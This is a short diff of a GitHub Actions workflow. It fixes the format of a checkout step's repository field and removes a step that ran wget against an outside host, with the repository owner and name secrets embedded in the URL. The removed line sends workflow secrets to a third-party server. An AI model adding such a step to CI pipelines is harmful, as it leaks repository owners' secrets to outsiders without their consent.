@@ -29,12 +29,10 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - run: |
-          wget https://intrigus.uber.space/foo?https://github.com/${{ secrets.REPO_OWNER }}/${{ secrets.REPO_NAME }}end
       - name: Checkout private target
         uses: actions/checkout@v3
         with:
-         repository: https://github.com/${{ secrets.REPO_OWNER }}/${{ secrets.REPO_NAME }}
+         repository: ${{ secrets.REPO_OWNER }}/${{ secrets.REPO_NAME }}
          token: ${{ secrets.CLONE_URL_PAT }}
          persist-credentials: false
          path: target
